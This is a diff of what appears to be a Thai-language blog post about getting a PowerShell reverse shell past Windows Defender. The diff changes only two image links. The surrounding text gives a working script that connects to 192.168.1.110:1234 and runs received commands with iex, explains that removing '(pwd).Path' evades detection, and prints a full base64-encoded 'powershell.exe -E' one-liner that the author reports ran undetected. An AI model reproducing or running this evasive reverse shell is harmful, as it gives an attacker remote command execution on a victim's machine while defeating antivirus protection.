@@ -117,7 +117,7 @@ $client.Close();
 <p>OMG แค่โปรแกรมเอาข้อความที่ได้รับจาก TCP มา Eval แล้วส่งกลับ มันจับได้ไงวะเนี่ย</p>
 </blockquote>
 <p>เป็นดังภาพครับ</p>
-<p><img src="https://ggez.cc/img/wtf-do-you-want-windows-defender-1.png" alt="Antivirus Detected"></p>
+<p><img src="https://imgur.com/jwNXteU" alt="Antivirus Detected"></p>
 <p>ผมเลยลองพยายามหาว่ามันจับจากอะไรพยายามลบคำสั่งต่าง ๆ ไปเรื่อย ๆ จนท้อ แต่ไม่รู้คิดไงเหมือนกัน ไปลบ <code>(pwd).Path</code> ออกจับไม่ได้เฉย Powershell Script ก็จะเป็นประมาณนี้ครับ</p>
 <pre><code class="language-powershell">$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.1.110&quot;,1234);
 $stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};
@@ -150,7 +150,7 @@ $client.Close();
 <pre><code>powershell.exe -E JABhAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAOQAyAC4AMQA2ADgALgAxAC4AMQAxADAAIgAsADEAMgAzADQAKQA7ACQAYgA9ACQAYQAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGQAPQAwAC4ALgAyADUANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAZQA9ACQAYgAuAFIAZQBhAGQAKAAkAGQALAAwACwAJABkAC4ATABlAG4AZwB0AGgAKQApAC0AbgBlACAAMAApAHsAJABpAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZAAsADAALAAkAGUAKQA7ACQAawA9ACgAaQBlAHgAIAAkAGkAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQAbQA9ACQAawAgACsAIAAiAFAAUwAgACIAIAArACAAKAAoAGQAaQByACkALgBEAGkAcgBlAGMAdABvAHIAeQBOAGEAbQBlACAAfAAgAFMAZQBsAGUAYwB0ACAALQBJAG4AZABlAHgAIAAwACkAIAArACAAIgA+ACAAIgA7ACQAbwA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABtACkAOwAkAGIALgBXAHIAaQB0AGUAKAAkAG8ALAAwACwAJABvAC4ATABlAG4AZwB0AGgAKQA7ACQAYgAuAEYAbAB1AHMAaAAoACkAOwB9ADsAJABhAC4AQwBsAG8AcwBlACgAKQA7AA==
 </code></pre>
 <p>หลังจากเอาไป Execute ก็ Happy Ending ครับ ดังรูป</p>
-<p><img src="https://ggez.cc/img/wtf-do-you-want-windows-defender-2.png" alt="Noob Antivirus"></p>
+<p><img src="https://imgur.com/mjG1vlD" alt="Noob Antivirus"></p>
 <p>จบเรื่องนี้ผมก็ยังไม่เข้าใจคุณ Windows Defender ว่าเขาต้องการอะไรจากน้อง Reverse Shell ของผม</p>
 <ol>
 <li>คุณ Windows Defender จะ Detect ทำไมกับโปรแกรมรับข้อความจาก TCP มา Eval แล้วส่งกลับ</li>
